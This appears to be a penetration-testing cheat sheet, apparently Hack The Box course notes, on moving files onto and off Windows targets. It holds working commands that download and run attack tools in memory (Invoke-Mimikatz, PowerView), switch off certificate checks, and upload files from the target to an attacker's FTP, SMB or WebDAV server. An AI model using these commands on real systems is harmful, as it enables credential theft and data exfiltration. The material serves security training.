# File Transfers
## @Author : M3tr1c_r00t
### Windows File Transfer Methods
#### Fileless Threats
Fileless attacks are a type of cyber attack that does not rely on malware being installed on a victim's computer as a file. Instead, fileless attacks exploit vulnerabilities in legitimate software already running on the victim's computer or use tools built into the operating system to carry out malicious actions.

In fileless attacks, the attacker may use techniques such as injecting malicious code into a legitimate process, modifying system configurations or settings, or using scripts or PowerShell to execute malicious commands. Because fileless attacks do not require the installation of malware on a victim's computer, they can be more difficult to detect and prevent than traditional malware-based attacks.

#### Methods for file transfer
#### Powershell Base64 Encode and Decode
We can try and encode our code into base64, transfer this encoding to the target system and then decode it on the target system.

Fully base64 encoding a file;
```
cat file_name | base64 -w 0;echo
```
Copy the resultant content to a powershell terminal and we can decode it.
```
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\FILE_NAME", [Convert]::FromBase64String("YOUR_BASE_64_STRING"))
```
We can confirm if the file is indeed the same as ours by checking the md5 hash
__Linux;__
```
md5sum FILE_NAME
```
__Windows;__
```
Get-FileHash C:\Users\Public\FILE_NAME -Algorithm md5
```

Note that this may not always be possible as the Windows command line has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

![image](https://user-images.githubusercontent.com/99975622/222534126-af8b9962-f253-4b19-b9e8-7f59ff00bb9d.png)

#### Powershell DownloadFile Method(File Download)
__DownloadFile__
```
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
__Download File Async__
```
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### Powershell DownloadString -Fileless Method
PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
We can also use pipe IEX.
```
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
#### Powershell Invoke-WebRequest
From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
### Resources
```
https://gist.github.com/HarmJ0y/bb48307ffa663256e239
```
### Common Errors with PowerShell
- If the Internet Explorer First-Launch configuration hasn't been completed, this prevents the download.
We can bypass this by using the parameter ```-UseBasicParsing```
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
- Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with;
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads
SMB  enables applications and users to transfer files to and from remote servers.

For this, we need to create an smb server.
We can use **smbserver.py** from impacket.

On our linux machine;
```
# We need to create our files into the /tmp/smbshare directory

sudo impacket-smbserver share -smb2support /tmp/smbshare
```

On the target windows machine;
```
copy \\YOUR_IP\share\nc.exe
```
On newer windows versions, unauthenticated guess access may be blocked for security reasons.

To bypass this, we can set up our smb server with a username and password.
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

We can also mount our share;
```
# Mounting our share
net use n: \\192.168.220.133\share /user:test test
# accessing our files
copy n:\nc.exe
```

### FTP Downloads
Ftp usually uses port TCP/21 and TCP/20

We can configure an FTP server using python3 pyftpdlib module.
__Installation__
```
sudo pip3 install pyftpdlib
```
__Now serving the server...__
```
# Anonymous login is usually set by default if we dont specify the credentials.

sudo python3 -m pyftpdlib --port 21
```

__Transferring files onto the target machine__
```
(New-Object Net.WebClient).DownloadFile('ftp://IP_FILE/file.txt', 'file.txt')
```
![image](https://user-images.githubusercontent.com/99975622/222541239-1b5e0462-b623-41f8-b779-555f7467c1b3.png)

### Moving Files from the Target Machine to your Attack Machine
#### Powershell Base64 Encode & Decode
__Encoding the files on the target machine__
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
__Confirming The MD5-hash__
```
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

You can then copy the bas64 encoded string and decode it onto your machine.
```
echo BASE64_HASH | base64 -d > file_name
```
#### Powershell Web Uploads
PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For the web-server,we can use uploadserver, a python module that includes a file upload page.

__installing;__
```
pip3 install uploadserver
```
__Running the web-server__
```
python3 -m uploadserver
```
With that, we can use a PowerShell script PSUpload.ps1 which uses Invoke-WebRequest to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. 

We can then upload a file to our server from the target host.
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
### PowerShell Base64 Web Upload
![image](https://user-images.githubusercontent.com/99975622/222544510-7f0e7893-d223-4e9f-85e6-970af821c5e9.png)
### SMB Uploads
Note that we can run smb over HTTP/HTTPS with WebDav.

WebDav is an extension of HTTP, the internet protocol that web-browsers and web-servers use to communicate with each other.

The WebDav protocol enables a web-server to behave like a file server, supporting collaborative content authoring. 

When using SMB, it will first attempt to connect using the SMB protocol and if there's no SMB share available, it will try to connect using HTTP.

#### Configuring WebDav Server...
we need to install the python modules on our system...
```
sudo pip install wsgidav cheroot
```
#### Usage...
```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
We can then store our files in the /tmp directory.

#### Connecting on our target machine...
```
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

#### Uploading Files...
```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

### FTP Uploads
When starting our ftp server, we need to give it the ```--write``` so that we can save the files.
On our attack machine;
```
sudo python3 -m pyftpdlib --port 21 --write
```
On the target windows machine;
```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
We can also create an command file to upload a file;
![image](https://user-images.githubusercontent.com/99975622/222563528-52f5b709-181f-4cda-a0a7-3e6984f36c8d.png)

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
